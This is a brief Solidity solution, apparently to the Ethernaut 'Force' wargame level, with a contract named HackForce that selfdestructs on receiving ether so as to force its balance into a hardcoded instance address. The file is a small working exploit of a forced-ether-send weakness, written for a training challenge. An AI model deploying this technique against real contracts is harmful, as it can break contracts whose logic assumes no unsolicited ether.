// => Player address 0x0718eccf37de50e31620C658B2c96adDc1e76300
// => Ethernaut address 0xD991431D8b033ddCb84dAD257f4821E9d5b38C33
// => Instance address 0x33a451bb6Cb712100187eA59fC8e69d310F0C08d

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

// with selfdestruct you kill the smart contract and transfer the balance to the specified address without calling the fallback function
// so sending money to this contract will kill it and transfer the balance to the target contract

contract HackForce {
    receive() external payable {
        selfdestruct(0x33a451bb6Cb712100187eA59fC8e69d310F0C08d);
    }
}